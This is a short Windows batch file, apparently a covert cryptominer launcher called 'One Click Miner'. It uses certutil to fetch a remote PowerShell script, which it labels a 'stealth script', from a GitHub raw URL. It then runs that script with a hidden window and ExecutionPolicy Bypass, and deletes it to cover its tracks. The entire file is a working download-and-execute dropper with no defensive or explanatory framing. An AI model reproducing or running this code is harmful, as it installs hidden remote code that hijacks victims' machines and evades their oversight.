@echo off
cls
echo Initializing One Click Miner...

REM 1. Define variables
set url=https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/miner.ps1
set output=%USERPROFILE%\temp-miner.ps1

REM 2. Download the PowerShell script silently
echo Downloading stealth script...
certutil -urlcache -split -f %url% %output%

REM 3. Run the PowerShell script (Invisible)
echo Running miner...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%output%"

REM 4. Cleanup
del %output%
exit
